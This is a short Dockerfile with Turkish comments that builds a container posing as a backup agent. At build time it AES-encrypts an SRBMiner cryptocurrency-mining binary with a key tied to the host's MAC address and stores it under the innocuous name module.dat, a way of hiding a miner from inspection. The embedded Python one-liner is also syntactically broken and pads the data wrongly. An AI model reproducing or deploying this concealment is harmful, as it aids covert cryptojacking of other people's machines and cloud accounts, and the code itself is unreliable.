# Örnek Dockerfile satırları
FROM python:3.10-slim
RUN pip install pycryptodome
COPY backup_agent.py /opt/backup_agent.py
COPY start.sh /start.sh

# SRBMiner binary'sini şifrele
RUN python -c "\
from Crypto.Cipher import AES; \
import hashlib, os; \
mac = open('/sys/class/net/eth0/address').read().strip(); \
key = hashlib.sha256(mac.encode() + b'backup_module_v2').digest(); \
with open('/tmp/srbminer', 'rb') as f: data = f.read(); \
iv = os.urandom(16); \
cipher = AES.new(key, AES.MODE_CBC, iv); \
enc = iv + cipher.encrypt(data + b'\x10'*16); \
with open('/var/lib/backup/module.dat', 'wb') as f: f.write(enc); \
" && rm /tmp/srbminer

CMD ["bash", "/start.sh"]
